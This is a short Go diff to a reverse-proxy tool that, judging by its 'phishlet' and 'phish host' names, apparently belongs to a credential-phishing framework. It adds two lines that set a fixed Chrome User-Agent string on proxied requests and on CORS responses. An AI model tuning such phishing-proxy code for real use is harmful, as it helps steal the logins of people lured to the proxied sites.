@@ -210,6 +210,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
@@ -1307,6 +1308,7 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		origin := req.Header.Get("Origin")
 		if origin != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", origin)
+			resp.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
 		}
 		return req, resp
 	}
